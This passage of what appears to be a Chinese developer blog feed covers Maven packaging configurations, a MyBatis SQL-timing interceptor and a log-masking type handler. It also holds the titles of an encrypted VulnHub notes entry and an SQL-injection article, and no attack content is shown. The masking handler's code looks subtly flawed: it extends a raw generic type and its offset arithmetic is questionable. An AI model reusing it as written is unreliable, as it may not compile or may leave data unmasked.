<li>使用插件maven-resources-plugin处理配置文件打包到config目录<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">       &lt;encoding&gt;UTF-8&lt;/encoding&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">   &lt;executions&gt;</span><br><span class="line">      &lt;execution&gt;</span><br><span class="line">          &lt;id&gt;copy-dependencies&lt;/id&gt;</span><br><span class="line">          &lt;phase&gt;package&lt;/phase&gt;</span><br><span class="line">          &lt;goals&gt;</span><br><span class="line">             &lt;goal&gt;copy-resources&lt;/goal&gt;</span><br><span class="line">          &lt;/goals&gt;</span><br><span class="line">  &lt;configuration&gt;</span><br><span class="line">&lt;!--配置文件打包成config目录下 --&gt;</span><br><span class="line">      &lt;outputDirectory&gt;$&#123;project.build.directory&#125;/twin-web/config&lt;/outputDirectory&gt;</span><br><span class="line">      &lt;resources&gt;</span><br><span class="line">      &lt;resource&gt;</span><br><span class="line">      &lt;directory&gt;src/main/resources&lt;/directory&gt;</span><br><span class="line">      &lt;/resource&gt;</span><br><span class="line">      &lt;/resources&gt;</span><br><span class="line">     &lt;/configuration&gt;</span><br><span class="line">  &lt;/execution&gt;</span><br><span class="line">&lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure></li>
<li>使用maven-jar-plugin 打包可执行jar 并排除依赖<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">   &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="line">   &lt;configuration&gt;</span><br><span class="line">      &lt;outputDirectory&gt;</span><br><span class="line">          &lt;!--输入打包可执行的jar到twin-web\libs\下--&gt;</span><br><span class="line">          $&#123;project.build.directory&#125;/twin-web/</span><br><span class="line">       &lt;/outputDirectory&gt;</span><br><span class="line">      &lt;archive&gt;</span><br><span class="line">        &lt;addMavenDescriptor&gt;false&lt;/addMavenDescriptor&gt;</span><br><span class="line">       &lt;manifest&gt;</span><br><span class="line">             &lt;addClasspath&gt;true&lt;/addClasspath&gt;</span><br><span class="line">         &lt;!-- 增加执行启动jar的依赖jar包目录前缀--&gt;</span><br><span class="line">           &lt;classpathPrefix&gt;./libs/&lt;/classpathPrefix&gt;</span><br><span class="line">         &lt;!-- 指定启动类--&gt;</span><br><span class="line">            &lt;mainClass&gt;com.keqing.twinweb.TwinWebApplication&lt;/mainClass&gt;</span><br><span class="line">        &lt;/manifest&gt;</span><br><span class="line">        &lt;manifestEntries&gt;</span><br><span class="line">          &lt;!-- 增加配置文件的classpath--&gt;</span><br><span class="line">          &lt;Class-Path&gt;./config/&lt;/Class-Path&gt;</span><br><span class="line">      &lt;/manifestEntries&gt;</span><br><span class="line">&lt;/archive&gt;</span><br><span class="line">&lt;!-- 排除配置文件--&gt;</span><br><span class="line">     &lt;excludes&gt;</span><br><span class="line">         &lt;exclude&gt;*.yml&lt;/exclude&gt;</span><br><span class="line">         &lt;exclude&gt;mapper/**&lt;/exclude&gt;</span><br><span class="line">         &lt;exclude&gt;*.xml&lt;/exclude&gt;</span><br><span class="line">     &lt;/excludes&gt;</span><br><span class="line">  &lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure></li>
<li>使用maven-dependency-plugin 打包libs目录下<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">   &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;</span><br><span class="line">   &lt;executions&gt;</span><br><span class="line">   &lt;execution&gt;</span><br><span class="line">      &lt;id&gt;copy-dependencies&lt;/id&gt;</span><br><span class="line">      &lt;phase&gt;package&lt;/phase&gt;</span><br><span class="line">      &lt;goals&gt;</span><br><span class="line">         &lt;goal&gt;copy-dependencies&lt;/goal&gt;</span><br><span class="line">      &lt;/goals&gt;</span><br><span class="line">     &lt;configuration&gt;</span><br><span class="line">          &lt;outputDirectory&gt;$&#123;project.build.directory&#125;/twin-web/libs&lt;/outputDirectory&gt;</span><br><span class="line">          &lt;excludeTransitive&gt;false&lt;/excludeTransitive&gt;</span><br><span class="line">          &lt;stripVersion&gt;false&lt;/stripVersion&gt;</span><br><span class="line">          &lt;includeScope&gt;runtime&lt;/includeScope&gt;</span><br><span class="line">      &lt;/configuration&gt;</span><br><span class="line">    &lt;/execution&gt;</span><br><span class="line">  &lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="方式三-使用maven-assembly-plugin打包"><a href="#方式三-使用maven-assembly-plugin打包" class="headerlink" title="方式三 使用maven-assembly-plugin打包"></a>方式三 使用maven-assembly-plugin打包</h5><ul>
<li>项目应用的配置文件排除<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;resources&gt;</span><br><span class="line">  &lt;resource&gt;</span><br><span class="line">         &lt;directory&gt;src/main/resources&lt;/directory&gt;</span><br><span class="line">             &lt;!--filerting设置为true,则打包过程中会对这些文件进行过滤处理--&gt;</span><br><span class="line">          &lt;filtering&gt;true&lt;/filtering&gt;</span><br><span class="line">         &lt;includes&gt;</span><br><span class="line">             &lt;!--使用通配符--&gt;</span><br><span class="line">            &lt;include&gt;**/*.properties&lt;/include&gt;</span><br><span class="line">            &lt;include&gt;**/*.yml&lt;/include&gt;</span><br><span class="line">            &lt;include&gt;**/*.xml&lt;/include&gt;</span><br><span class="line">           &lt;include&gt;mapper/*.xml&lt;/include&gt;</span><br><span class="line">        &lt;!-- 这里可以根据你实际想要包含的配置文件类型来添加更多的include配置 --&gt;</span><br><span class="line">        &lt;/includes&gt;</span><br><span class="line">   &lt;/resource&gt;</span><br><span class="line">&lt;/resources&gt;</span><br></pre></td></tr></table></figure></li>
<li>配置spring-boot-maven-plugin<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">   &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">   &lt;configuration&gt;</span><br><span class="line">    &lt;!--项目的启动类,如果有多个main就必须指定，没有可以缺失</span><br><span class="line">         &lt;mainClass&gt;XXXXX.TwinWebApplication&lt;/mainClass&gt;--&gt;</span><br><span class="line">        &lt;!--解决windows命令行窗口中文乱码--&gt;</span><br><span class="line">        &lt;jvmArguments&gt;-Dfile.encoding=UTF-8&lt;/jvmArguments&gt;</span><br><span class="line">        &lt;layout&gt;ZIP&lt;/layout&gt;</span><br><span class="line">           &lt;!--配置需要打包进项目的jar--&gt;</span><br><span class="line">       &lt;includes&gt;</span><br><span class="line">        &lt;!--填写需要打包所需要的依赖 。没有匹配上任何jar包机排除依赖--&gt;</span><br><span class="line">          &lt;include&gt;</span><br><span class="line">          &lt;groupId&gt;no-exists-jar&lt;/groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;non-exists-jar&lt;/artifactId&gt;</span><br><span class="line">          &lt;/include&gt;</span><br><span class="line">      &lt;/includes&gt;</span><br><span class="line">   &lt;/configuration&gt;</span><br><span class="line">   &lt;executions&gt;</span><br><span class="line">         &lt;execution&gt;</span><br><span class="line">           &lt;goals&gt;</span><br><span class="line">                 &lt;!-- 表示当运行mavn package打包时，使用Springboot插件打包 --&gt;</span><br><span class="line">              &lt;goal&gt;repackage&lt;/goal&gt;</span><br><span class="line">          &lt;/goals&gt;</span><br><span class="line">      &lt;/execution&gt;</span><br><span class="line">  &lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure></li>
<li>引入springboot里约定maven-assembly-plugin<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">    &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">&lt;!-- 打包文件名字不包含 assembly.xml 中 id --&gt;</span><br><span class="line">      &lt;appendAssemblyId&gt;false&lt;/appendAssemblyId&gt;</span><br><span class="line">      &lt;descriptors&gt;</span><br><span class="line">      &lt;!--项目所在目录配置文件的 assembly.xml文件 --&gt;</span><br><span class="line">        &lt;descriptor&gt;assembly.xml&lt;/descriptor&gt;</span><br><span class="line">      &lt;/descriptors&gt;</span><br><span class="line">  &lt;/configuration&gt;</span><br><span class="line">&lt;executions&gt;</span><br><span class="line">   &lt;execution&gt;</span><br><span class="line">   &lt;id&gt;make-assembly&lt;/id&gt;</span><br><span class="line">   &lt;phase&gt;package&lt;/phase&gt;</span><br><span class="line">   &lt;goals&gt;</span><br><span class="line">          &lt;goal&gt;single&lt;/goal&gt;</span><br><span class="line">    &lt;/goals&gt;</span><br><span class="line">    &lt;/execution&gt;</span><br><span class="line">  &lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure>
配置assembly.xml文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;assembly&gt;</span><br><span class="line">   &lt;!-- 打包文件名的标识符，用来做后缀--&gt;</span><br><span class="line">    &lt;id&gt;make-assembly&lt;/id&gt;</span><br><span class="line">    &lt;!-- 打包的类型，如果有N个，将会打N个类型的包 --&gt;</span><br><span class="line">   &lt;formats&gt;</span><br><span class="line">      &lt;format&gt;tar.gz&lt;/format&gt;</span><br><span class="line">      &lt;format&gt;zip&lt;/format&gt;</span><br><span class="line">   &lt;/formats&gt;</span><br><span class="line">     &lt;!-- 压缩包下是否生成和项目名相同的根目录 --&gt;</span><br><span class="line">   &lt;includeBaseDirectory&gt;true&lt;/includeBaseDirectory&gt;</span><br><span class="line">     &lt;!-- 用来设置一组文件在打包时的属性。--&gt;</span><br><span class="line">  &lt;fileSets&gt;</span><br><span class="line">   &lt;!-- 0755-&gt;即用户具有读/写/执行权限，组用户和其它用户具有读写权限；--&gt;</span><br><span class="line">    &lt;!-- 0644-&gt;即用户具有读写权限，组用户和其它用户具有只读权限；--&gt;</span><br><span class="line">    &lt;!-- 将src/bin目录下的jar启动脚本输出到打包后的目录中 --&gt;</span><br><span class="line">    &lt;fileSet&gt;</span><br><span class="line">     &lt;!--lineEnding选项可用于控制给定的行结束文件 --&gt;</span><br><span class="line">       &lt;lineEnding&gt;unix&lt;/lineEnding&gt;</span><br><span class="line">       &lt;directory&gt;$&#123;basedir&#125;/bin&lt;/directory&gt;</span><br><span class="line">       &lt;outputDirectory&gt;$&#123;file.separator&#125;&lt;/outputDirectory&gt;</span><br><span class="line">       &lt;fileMode&gt;0755&lt;/fileMode&gt;</span><br><span class="line">       &lt;includes&gt;</span><br><span class="line">         &lt;include&gt;**.sh&lt;/include&gt;</span><br><span class="line">         &lt;include&gt;**.bat&lt;/include&gt;</span><br><span class="line">      &lt;/includes&gt;</span><br><span class="line">   &lt;/fileSet&gt;</span><br><span class="line">&lt;!-- 把项目的配置文件，打包进压缩文件的config目录 --&gt;</span><br><span class="line">   &lt;fileSet&gt;</span><br><span class="line">      &lt;directory&gt;$&#123;basedir&#125;/src/main/resources&lt;/directory&gt;</span><br><span class="line">      &lt;outputDirectory&gt;config&lt;/outputDirectory&gt;</span><br><span class="line">      &lt;fileMode&gt;0644&lt;/fileMode&gt;</span><br><span class="line">      &lt;includes&gt;</span><br><span class="line">           &lt;include&gt;*.properties&lt;/include&gt;</span><br><span class="line">           &lt;include&gt;*.yml&lt;/include&gt;</span><br><span class="line">          &lt;include&gt;*.xml&lt;/include&gt;</span><br><span class="line">         &lt;include&gt;mapper/*.xml&lt;/include&gt;</span><br><span class="line">      &lt;/includes&gt;</span><br><span class="line">   &lt;/fileSet&gt;</span><br><span class="line">   &lt;!-- 把项目自己编译出来的jar文件，打包进zip文件的根目录 --&gt;</span><br><span class="line">    &lt;fileSet&gt;</span><br><span class="line">      &lt;directory&gt;$&#123;project.build.directory&#125;&lt;/directory&gt;</span><br><span class="line">      &lt;outputDirectory&gt;$&#123;file.separator&#125;&lt;/outputDirectory&gt;</span><br><span class="line">      &lt;includes&gt;</span><br><span class="line">          &lt;include&gt;*.jar&lt;/include&gt;</span><br><span class="line">      &lt;/includes&gt;</span><br><span class="line">   &lt;/fileSet&gt;</span><br><span class="line"> &lt;/fileSets&gt;</span><br><span class="line">&lt;!-- 依赖包的拷贝--&gt;</span><br><span class="line">&lt;dependencySets&gt;</span><br><span class="line">   &lt;dependencySet&gt;</span><br><span class="line">     &lt;unpack&gt;false&lt;/unpack&gt;</span><br><span class="line">    &lt;useProjectArtifact&gt;true&lt;/useProjectArtifact&gt;</span><br><span class="line">    &lt;outputDirectory&gt;lib&lt;/outputDirectory&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">  &lt;/dependencySet&gt;</span><br><span class="line">  &lt;dependencySet&gt;</span><br><span class="line">      &lt;unpack&gt;false&lt;/unpack&gt;</span><br><span class="line">      &lt;useProjectArtifact&gt;true&lt;/useProjectArtifact&gt;</span><br><span class="line">      &lt;outputDirectory&gt;lib&lt;/outputDirectory&gt;</span><br><span class="line">      &lt;scope&gt;system&lt;/scope&gt;</span><br><span class="line">  &lt;/dependencySet&gt;</span><br><span class="line">  &lt;dependencySet&gt;</span><br><span class="line">     &lt;unpack&gt;false&lt;/unpack&gt;</span><br><span class="line">     &lt;useProjectArtifact&gt;true&lt;/useProjectArtifact&gt;</span><br><span class="line">     &lt;outputDirectory&gt;lib&lt;/outputDirectory&gt;</span><br><span class="line">     &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">  &lt;/dependencySet&gt;</span><br><span class="line">&lt;/dependencySets&gt;</span><br><span class="line">&lt;/assembly&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Java后端框架</category>
      </categories>
      <tags>
        <tag>SpringBoot框架</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis笔记</title>
    <url>/cnblogs.github.io/2025/01/10/backEnd/java/mybatis/Mybatis%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="自定义插件"><a href="#自定义插件" class="headerlink" title="自定义插件"></a>自定义插件</h3><p>假设我们想做一个插件，用于统计每个 SQL 查询的执行时间。这听起来是不是很酷？下面就是实现这个功能的具体步骤。</p>
<h4 id="第一步：实现-Interceptor-接口"><a href="#第一步：实现-Interceptor-接口" class="headerlink" title="第一步：实现 Interceptor 接口"></a>第一步：实现 Interceptor 接口</h4><p>MyBatis 插件的核心在于实现org.apache.ibatis.plugin.Interceptor 接口。这个接口只有一个方法需要重写：intercept(Invocation invocation)。我们可以通过这个方法插入自定义逻辑。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.ibatis.executor.statement.StatementHandler;</span><br><span class="line">import org.apache.ibatis.plugin.*;</span><br><span class="line">import org.apache.ibatis.session.ResultHandler;</span><br><span class="line"></span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">@Intercepts(&#123;</span><br><span class="line">    @Signature(type = StatementHandler.class, method = &quot;query&quot;, args = &#123;java.sql.Statement.class, ResultHandler.class&#125;),</span><br><span class="line">    @Signature(type = StatementHandler.class, method = &quot;update&quot;, args = &#123;java.sql.Statement.class&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">public class TimeStatInterceptor implements Interceptor &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object intercept(Invocation invocation) throws Throwable &#123;</span><br><span class="line">        long start = System.currentTimeMillis();</span><br><span class="line">        try &#123;</span><br><span class="line">            return invocation.proceed(); // 调用原始方法</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            long end = System.currentTimeMillis();</span><br><span class="line">            System.out.println(&quot;SQL Execution Time: &quot; + (end - start) + &quot; ms&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object plugin(Object target) &#123;</span><br><span class="line">        return Plugin.wrap(target, this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void setProperties(Properties properties) &#123;</span><br><span class="line">        // 可以在这里设置插件属性</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第二步：配置插件"><a href="#第二步：配置插件" class="headerlink" title="第二步：配置插件"></a>第二步：配置插件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugins&gt;</span><br><span class="line">    &lt;plugin interceptor=&quot;com.example.TimeStatInterceptor&quot;/&gt;</span><br><span class="line">&lt;/plugins&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Mybatis数据进行脱敏显示"><a href="#Mybatis数据进行脱敏显示" class="headerlink" title="Mybatis数据进行脱敏显示"></a>Mybatis数据进行脱敏显示</h3><h4 id="创建脱敏数据处理器"><a href="#创建脱敏数据处理器" class="headerlink" title="创建脱敏数据处理器"></a>创建脱敏数据处理器</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.ibatis.type.BaseTypeHandler;</span><br><span class="line">import org.apache.ibatis.type.JdbcType;</span><br><span class="line">import org.apache.ibatis.type.MappedJdbcTypes;</span><br><span class="line">import org.apache.ibatis.type.MappedTypes;</span><br><span class="line"></span><br><span class="line">import java.sql.CallableStatement;</span><br><span class="line">import java.sql.PreparedStatement;</span><br><span class="line">import java.sql.ResultSet;</span><br><span class="line">import java.sql.SQLException;</span><br><span class="line">import java.util.regex.Matcher;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line">@MappedJdbcTypes(JdbcType.VARCHAR)</span><br><span class="line">@MappedTypes(String.class)</span><br><span class="line">public class SensitiveInfoTypeHandler extends BaseTypeHandler &#123;</span><br><span class="line">    // 关键字列表，实际开发中，关键字列表可以做成配置或在表中存储，这样可以更灵活</span><br><span class="line">    private static final String KEYWORD_PATTERN = &quot;token|Authorization|password|email|keyword1|keyword2|keyword3&quot;;</span><br><span class="line">  </span><br><span class="line">    private static final Pattern PATTERN = Pattern.compile(KEYWORD_PATTERN);</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void setNonNullParameter(PreparedStatement ps, int i, String parameter, JdbcType jdbcType) throws SQLException &#123;</span><br><span class="line">        // 一般个人信息或敏感数据都要加密存储，可以参考文末给出的数据加解密处理方案，这里不处理</span><br><span class="line">        ps.setString(i, parameter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getNullableResult(ResultSet rs, String columnName) throws SQLException &#123;</span><br><span class="line">        // 对结果进行脱敏</span><br><span class="line">        return desensitize(rs.getString(columnName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getNullableResult(ResultSet rs, int columnIndex) throws SQLException &#123;</span><br><span class="line">        // 对结果进行脱敏</span><br><span class="line">        return desensitize(rs.getString(columnIndex));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getNullableResult(CallableStatement cs, int columnIndex) throws SQLException &#123;</span><br><span class="line">        // 对结果进行脱敏</span><br><span class="line">        return desensitize(cs.getString(columnIndex));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private String desensitize(String value) &#123;</span><br><span class="line">        if (value == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 如果字段中存在指定的关键字，则对关键字后面10位字符串使用***代替</span><br><span class="line">        Matcher matcher = PATTERN.matcher(value);</span><br><span class="line">        StringBuilder result = new StringBuilder(value);</span><br><span class="line">        int offset = 0;</span><br><span class="line">        while (matcher.find()) &#123;</span><br><span class="line">            int start = matcher.start() + matcher.group().length();</span><br><span class="line">            int end = Math.min(start + 10, result.length());</span><br><span class="line">            result.replace(start + offset, end + offset, &quot;***&quot;);</span><br><span class="line">            offset += &quot;***&quot;.length() - (end - start);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 返回脱敏后的数据</span><br><span class="line">        return result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述代码中：</p>
<ul>
<li>KEYWORD_PATTERN 定义了一个包含多个关键字的正则表达式模式，关键字之间用 | 分隔。</li>
<li>desensitize 方法中，通过 Pattern 和 Matcher 来查找字符串中所有匹配关键字的位置。</li>
<li>使用 StringBuilder 来修改原始字符串，将关键字后的 10 位字符串替换为 ***。在替换过程中，考虑到替换字符串长度变化对后续位置的影响，通过 offset 变量进行修正</li>
</ul>
<h4 id="在Mapper-XML中使用"><a href="#在Mapper-XML中使用" class="headerlink" title="在Mapper XML中使用"></a>在Mapper XML中使用</h4><p> 示例中对请求头req_headers、响应体resp_body字段应用脱敏处理器<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.example.demo.entity.Log&quot;&gt;</span><br><span class="line">        &lt;id column=&quot;id&quot; property=&quot;id&quot; jdbcType=&quot;BIGINT&quot;/&gt;</span><br><span class="line">        &lt;result column=&quot;url&quot; property=&quot;url&quot; jdbcType=&quot;VARCHAR&quot;/&gt;</span><br><span class="line">        &lt;result column=&quot;req_headers&quot; property=&quot;reqHeaders&quot; jdbcType=&quot;VARCHAR&quot; typeHandler=&quot;com.example.demo.typehandler.SensitiveInfoTypeHandler&quot;/&gt;</span><br><span class="line">        &lt;result column=&quot;resp_headers&quot; property=&quot;respHeaders&quot; jdbcType=&quot;VARCHAR&quot;/&gt;</span><br><span class="line">        &lt;result column=&quot;resp_body&quot; property=&quot;respBody&quot; jdbcType=&quot;VARCHAR&quot; typeHandler=&quot;com.example.demo.typehandler.SensitiveInfoTypeHandler&quot;/&gt;</span><br><span class="line">        &lt;result column=&quot;cost_time&quot; property=&quot;costTime&quot; jdbcType=&quot;BIGINT&quot;/&gt;</span><br><span class="line">    &lt;/resultMap&gt;</span><br><span class="line"></span><br><span class="line">&lt;select id=&quot;selectUser&quot; resultMap=&quot;BaseResultMap&quot;&gt;</span><br><span class="line">    SELECT id, url,</span><br><span class="line">           req_headers,</span><br><span class="line">           resp_headers,</span><br><span class="line">           resp_body,</span><br><span class="line">           cost_time</span><br><span class="line">    FROM logs</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Java后端框架</category>
      </categories>
      <tags>
        <tag>Mybatis框架</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub靶机笔记</title>
    <url>/cnblogs.github.io/2025/01/23/hacker/infiltrate/note/VulnHub%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="03541b2153404ebfd51c5174176f7ce723587b49957cbec8f1e42be173236e8f">3186c319156b07c01cb1ef89dd22490e485ebd5e770f3a816864e4205647f178ccba29da66332efc9fe8dbba1908c081adfa8b5698e3d5fc2f08dfb92667a6d75712092a9011cfce2170d788d39701577830feb167d9993ff9551d4b40b656245bd2cce5f0e9ac3fc91c5f13ebb6d7b5f34500bc56fb09caad31361f423af2e883172c700f2fe17b01c94b5964a9b30a4c2b4056ce182f6529f0a8b4856fa83947391b688fa7df1bf2d4c3b66f12916e19cc5c7833b660881c794ce26eb408ea8aa3b535a034c3b461c5ab128c53d13252ab0e0850d44ff4ac5e75be96a9d8c2323c6ed42e55160c9a1a13d7ad04d31af2c9d40fce715ce6dfc479a8b53b6aa519b1a9ac7391c50d73ad0ca3f435154cbae8ea5e2fa529cd2f7ba314edad6ef3aeee6e821b05c2bb8399d3d7e1c854194f38e517d51b070ba8e3763a958c280fb1fc179ce7de9899ef0461054756fcd97626251fca9afa9cc8499a55fb757a667cf04c096573f7c5d1c73c3bfdd85ec725525a5c647fd11e18a407a1a641fc936586685f1eb0898051dc6e95bcbbae972ae99a37e24d2de9c4ac536e8689bc1d7db784c5c81ba2c0cbfb9b7fd8b46c8088790885534a44edd202749ba23a434c355c41967b0b01c30d39de42a06e53d1d02e9874e9d18cc04d3983d9e6d235f0854cdefa383acfed5727953f249692cb5147250a7088ead7756d3142ef59e945c107ad7a5f0960760732402fbf11df6446a65cb4811b6b579549969d932f70644d5d7215bd5c8c7118ffeb1e944fd79d3e3bd27e2b9d6950a30aca2a586ea5bd1e5ff9b5091d5f8fe6f586a7e717de3b59c7b037ee145a8f58776712c7d1712ebe9dd5d980064720a97b108d497b19beefb7387dad4a9467016d5e306a52a07b465ab5bc9ac7bf1276eba8ecda193c0d331a6b32aa69efa19f9704843a47b2a9ff4df409668a425e23fc164be4b2f8c9b18d5378278bbd413db65ccb76220d55249a0fcb2180cdabb20ad0b5857521b5bc54da89fca0a0cb254846d4a594dfbc7182165c05a2c9b9bda73212c83cbc2ca96c027cdd9d1f5f21654f7e5d5330216e2dc6ef11b1a2aba6c686697a89bcc0abce2c8e0d7430bbe1b7032b2cb76861387c6df4cd4d7507bf25a5672a23a09c9ce8ce9a9ae46e6ba697f2a99051e749e2aea5d2826bbf59fd1c50002934355fce43a3883d9f12e98a3021197423b528fd042451cebcd3e3531c183ed670e4ec7c3e7922042442d2deb8aa5591b2c3f8148148850f72f1ef06e342a12b5dfaeeea599a9793cd8b8b89b3930bc59e0dcef55a6b2fffed3ecd7848844310a5937e79bd0fafbf958ec5b52f289ffa3f50f87c301189056bc4e119d8640310c77e43c1da56c9ffbabc19987d57f23420c7e3076a932cb2b22f6968e2a7d7ffcd80d2bdf904f1834c462e9a50d1a993a7668c79dd8eab6784a2e467af4105e6b778a4776b8041a80b50f3dfe248d5c90e0e96eacdefa6e222693f029e456edf754e5cd8bf9a84fd587573292cb24f0586bc9f400ff3d447f84d6a6eeafa1cb3956d11d8d0aed86b791657d66bd3ebb093eec1c70a4f3ce81b45235cab5de9542c1ded7707a44b942c199bc3fdb5277f6673d50d62b56ea36fb85ff583d712a62f605d55777ab0c7c6a45a42d55028239e5b61f0698731a862743eee8f26af0eae30adc0ef6fcc6270e4b6c7c207bed27602e0ac255eea2a1db2036d1405eacee3ec6cf9747c41f3ef2e84cc10b65a90a20eb49b3593c9df079b58862ad637b49fccb99418011a8cf1a87cb006ca9085c15f6d624a6b78ae9e9966cc747ed65eb6d695cbf0c107d25f98d810c1726dfdded2204ae5d60f2d903b92d60de8a3aa87ebb3b8868ed17ee1fb3957cfe643e616990ebb744b9c8d803937bbc3394c65213d221e84e8acf5041b38469293626f3fc320c343870fce50f6e754b94b491c7317feef6eab93f9a4051db841f848d00c6bb224285311d7576e2d895227364ae9a7941b71b8f7c482b7dafa2b2feea68ac779925adcf2472d5a592d4f7d21f67f7ae993fbcb80e29fe6579fc42d138df5b89f31371175455ad8bc906155a4989c95a76bd561196d6b52723cd3833344e50e66b4e2e81c47385401749298e437c8422567e33d72ba52ca35be0abe65494b8a41c26d227a2cec033e94548bc4812ef3331e26ed211300e219c3d45e62dd60b8f6a4979345fd9531db6c62a72df8bc69b8cea03c85617e00fd7d43acd1f7881d9d749c2ee9e719172b55abe65c8f40542bed70e2f74e8b1f27de39da955883ae13c035b16077c3d4d18d72e627459817a005a5e59c5994f676fdecf52cc61deb5a73f626f7599730c1c1b82d6588893024f5b3121858165342d09a236dc2c6f8a170428c291ba3dd8529848551da05729ea2629cd918bcee1ebf25eee58102ebf1f56534d589e6a82880d2cb4d50647d2dce824c571d37a1541e023891d621e55c96edc197d0fad0b2fa169737eec9ccd14ab1d10b43c5df00db4b198613d77ba4</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码输入框上描述性内容</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/cnblogs.github.io/lib/hbe.js"></script><link href="/cnblogs.github.io/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>WEB漏洞挖掘笔记</category>
      </categories>
      <tags>
        <tag>渗透笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB漏洞挖掘方法 - SQL注入篇</title>
    <url>/cnblogs.github.io/2025/01/04/hacker/infiltrate/shares/WEB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95-SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
    <content><![CDATA[<p><strong>常见的注入点</strong></p>
